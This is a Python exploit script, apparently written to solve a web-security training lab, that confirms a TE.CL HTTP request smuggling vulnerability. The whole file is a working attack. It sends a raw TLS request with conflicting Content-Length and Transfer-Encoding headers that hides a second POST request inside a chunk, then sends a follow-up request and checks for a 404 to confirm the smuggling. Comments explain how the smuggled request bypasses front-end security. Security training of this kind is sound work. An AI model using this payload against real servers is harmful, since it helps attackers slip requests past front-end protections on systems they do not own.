import socket
import ssl
import sys
import urllib3
import requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

"""Lab: HTTP request smuggling, confirming a TE.CL vulnerability via differential responses"""

def TE_CL(target_host,target_port):

    """
        # After identifying the behavior of the front-end and back-end servers, we use this payload:
        # - Set up a Content-Length of 4 bytes and specify Transfer-Encoding as 'chunked' because the front-end relies on it to determine the size of the request.
        # - The payload includes a chunk size of 'bb' (in hexadecimal, representing the size of 187 bytes).
        # - Inside this chunk, we include another HTTP request with Content-Length set to 15 bytes and a body of 'x=1'. 
        # - Finally, we close the chunked body with '0' and terminate it with '\r\n'.

        # How this works:
        # - The front-end processes the request using Transfer-Encoding and sends it to the back-end.
        # - The back-end processes the request using Content-Length, splitting the request into two separate parts.
        # - This allows the smuggled request to bypass front-end security and interact directly with the back-end server.
    """
    smuggling_payload=(
        "POST / HTTP/1.1\r\n"
        f"Host: {target_host}\r\n"
        "Content-Type: Application/x-www-form-urlencoded\r\n"
        "Content-Length: 4\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "bb\r\n"
        "POST /404 HTTP/1.1\r\n"
        f"Host: {target_host}\r\n"
        "Content-Type: Application/x-www-form-urlencoded\r\n"
        "Content-Length: 15\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "x=1\r\n"
        "0\r\n"
        "\r\n"
    )
    try:
        # Create SSL context for HTTPS
        #Creates a secure environment for HTTPS communication.
        context_ssl=ssl.create_default_context()
         #Opens a connection to the server (target_host) on the specified port (target_port).
        with socket.create_connection((target_host,target_port)) as sock:
            #Wraps the socket connection with encryption for secure data transfer.
            with context_ssl.wrap_socket(sock,server_hostname=target_host) as securesock:
                print('(+) Sendind payload .....')
                #sending the payload 
                securesock.sendall(smuggling_payload.encode('utf-8'))
                print('(+) Smuggled requeste sent . ')
                response=securesock.recv(4096)
                #check if the host down or not 
                if "504 Gateway Timeout" in response.decode():
                    print("(-) No response received from the server.")
                    sys.exit(1)
                else:
                    print('(+) Receving response .')
                    print('   --> Response : %s '%response.decode(errors='ignore').split('\n')[0])
                

                print('(+) Sendind second request ...')
                #send second request to see if we got the not found response that mean we got smuggling request successfully
                normal_response=requests.post("https://"+target_host,verify=False)
                if normal_response.status_code==404:
                    print('(+) Receving Response .')
                    print("   --> Response : HTTP/1.1 %s NOT FOUND "%normal_response.status_code)
                    print('(+) Smuggling requests successfully .')
                    print('(+) Lab solved .')
                else:
                    print('(-) Unexpected response status code')

    except Exception as err:
        print(f"(-) Error: {err}")

def main():
    if len(sys.argv) !=2:
        print('(+) Usage %s <url>'%sys.argv[0])
        print('(+) Example %s xxxxxxxxxxxxxxxxxxxxxxx.web-security-academy.net'%sys.argv[0])
        sys.exit()

    target_host=sys.argv[1]
    target_port=443
    TE_CL(target_host,target_port)

if __name__=="__main__":
    main()